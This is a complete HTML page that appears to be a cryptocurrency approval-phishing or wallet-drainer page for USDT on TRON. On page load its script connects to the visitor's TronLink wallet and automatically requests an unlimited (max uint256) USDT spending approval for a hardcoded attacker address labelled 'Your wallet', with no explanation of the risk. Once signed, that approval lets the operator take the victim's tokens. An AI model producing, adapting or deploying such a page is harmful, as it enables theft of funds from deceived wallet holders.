<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>USDT TRON Approval</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0b0f14;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .card {
      width: 90%;
      max-width: 380px;
      background: #111827;
      border-radius: 20px;
      padding: 25px;
      text-align: center;
    }

    .title {
      font-size: 20px;
      margin-bottom: 15px;
      color: #22c55e;
    }

    .address {
      background: #1f2937;
      border-radius: 12px;
      padding: 12px;
      font-family: monospace;
      font-size: 14px;
      word-break: break-all;
      margin: 20px 0;
    }

    .status {
      padding: 12px;
      border-radius: 12px;
      margin-top: 15px;
      font-size: 14px;
    }

    .success { background: #22c55e; }
    .pending { background: #f59e0b; }
    .error { background: #ef4444; }

    .spinner {
      border: 2px solid #374151;
      border-top: 2px solid #22c55e;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="title">Approve USDT (TRON)</div>
    
    <div>Approve unlimited spending for:</div>
    
    <div class="address" id="addressDisplay">
      TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
    </div>

    <div id="status" class="status pending">
      <div class="spinner"></div>
      Waiting for wallet connection...
    </div>
  </div>

  <script src="https://unpkg.com/@tronweb3/tronwallet-adapter@1.2.8/dist/TronLink.js"></script>
  <script>
    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRON mainnet
    const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"; // Your wallet
    const APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max UINT256

    async function approveUSDT() {
      try {
        const statusEl = document.getElementById('status');
        
        // Check if TronLink is available
        if (typeof window.tronWeb === 'undefined') {
          statusEl.innerHTML = 'Please install <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" style="color:#22c55e;">TronLink</a>';
          statusEl.className = 'status error';
          return;
        }

        // Request account access
        const result = await window.tronWeb.request({ method: 'tron_requestAccounts' });
        if (!result.code) {
          statusEl.innerHTML = '<div class="spinner"></div>Connected! Approving unlimited USDT...';
          
          // Build approve transaction
          const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
          
          const tx = await contract.approve(
            SPENDER_ADDRESS,
            APPROVE_AMOUNT
          ).send({
            feeLimit: 100000000 // 100 TRX
          });

          if (tx) {
            statusEl.innerHTML = `✅ Success! Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#22c55e;">${tx.slice(0,10)}...</a>`;
            statusEl.className = 'status success';
          }
        }
      } catch (error) {
        console.error('Approval failed:', error);
        document.getElementById('status').innerHTML = `❌ ${error.message || 'Approval rejected or failed'}`;
        document.getElementById('status').className = 'status error';
      }
    }

    // Auto-trigger approval when page loads
    window.addEventListener('load', () => {
      setTimeout(approveUSDT, 1000); // Small delay for wallet readiness
    });

    // Also trigger on wallet events
    if (window.tronWeb) {
      window.tronWeb.on('accountsChanged', () => location.reload());
    }
  </script>
</body>
</html>
